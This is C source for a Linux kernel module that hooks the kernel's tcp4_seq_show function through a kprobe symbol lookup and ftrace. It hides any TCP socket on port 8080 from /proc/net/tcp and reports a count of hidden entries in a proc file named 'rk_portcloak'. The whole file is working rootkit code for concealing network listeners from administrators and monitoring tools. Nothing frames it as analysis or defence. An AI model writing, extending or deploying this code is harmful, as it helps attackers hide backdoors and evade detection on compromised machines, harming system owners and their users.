// SPDX-License-Identifier: GPL-2.0
#include <linux/fs.h>
#include <linux/ftrace.h>
#include <linux/init.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/printk.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <net/inet_sock.h>
#include <net/tcp.h>

#define HIDDEN_PORT 8080

static struct proc_dir_entry *proc_entry;
static atomic_t hide_count = ATOMIC_INIT(0);
static unsigned long tcp_show_addr;
static struct ftrace_ops tcp_ops;

static unsigned long lookup_name(const char *name)
{
	struct kprobe kp = { .symbol_name = name };
	unsigned long addr;

	if (register_kprobe(&kp))
		return 0;
	addr = (unsigned long)kp.addr;
	unregister_kprobe(&kp);
	return addr;
}

static int suppress_entry(struct seq_file *seq, void *v)
{
	atomic_inc(&hide_count);
	return 0;
}

static void notrace intercept_tcp_show(unsigned long ip, unsigned long parent_ip,
				       struct ftrace_ops *ops,
				       struct ftrace_regs *fregs)
{
	struct pt_regs *regs = ftrace_get_regs(fregs);
	void *v;
	struct sock *sk;

	if (!regs || within_module(parent_ip, THIS_MODULE))
		return;

	v = (void *)regs->si;
	if (v == SEQ_START_TOKEN)
		return;

	sk = (struct sock *)v;
	if (sk && inet_sk(sk)->inet_sport == htons(HIDDEN_PORT))
		regs->ip = (unsigned long)suppress_entry;
}

static int install_hook(void)
{
	int err;

	tcp_show_addr = lookup_name("tcp4_seq_show");
	if (!tcp_show_addr)
		return -ENOENT;

	tcp_ops.func = intercept_tcp_show;
	tcp_ops.flags = FTRACE_OPS_FL_SAVE_REGS |
			FTRACE_OPS_FL_IPMODIFY |
			FTRACE_OPS_FL_RECURSION;

	err = ftrace_set_filter_ip(&tcp_ops, tcp_show_addr, 0, 0);
	if (err)
		return err;

	err = register_ftrace_function(&tcp_ops);
	if (err) {
		ftrace_set_filter_ip(&tcp_ops, tcp_show_addr, 1, 0);
		return err;
	}
	return 0;
}

static void remove_hook(void)
{
	unregister_ftrace_function(&tcp_ops);
	ftrace_set_filter_ip(&tcp_ops, tcp_show_addr, 1, 0);
}

static ssize_t stats_show(struct file *f, char __user *buf,
			  size_t count, loff_t *pos)
{
	char tmp[64];
	int len;

	len = snprintf(tmp, sizeof(tmp), "port=%d\nhidden=%d\n",
		       HIDDEN_PORT, atomic_read(&hide_count));
	return simple_read_from_buffer(buf, count, pos, tmp, len);
}

static const struct proc_ops port_ops = {
	.proc_read = stats_show,
};

static int __init porthider_init(void)
{
	int err;

	err = install_hook();
	if (err) {
		pr_err("rk: tcp4_seq_show not found\n");
		return err;
	}

	proc_entry = proc_create("rk_portcloak", 0444, NULL, &port_ops);
	if (!proc_entry) {
		remove_hook();
		return -ENOMEM;
	}

	pr_info("rk: hiding port %d from /proc/net/tcp\n", HIDDEN_PORT);
	return 0;
}

static void __exit porthider_exit(void)
{
	proc_remove(proc_entry);
	remove_hook();
}

module_init(porthider_init);
module_exit(porthider_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Network port concealment via tcp4_seq_show hook");
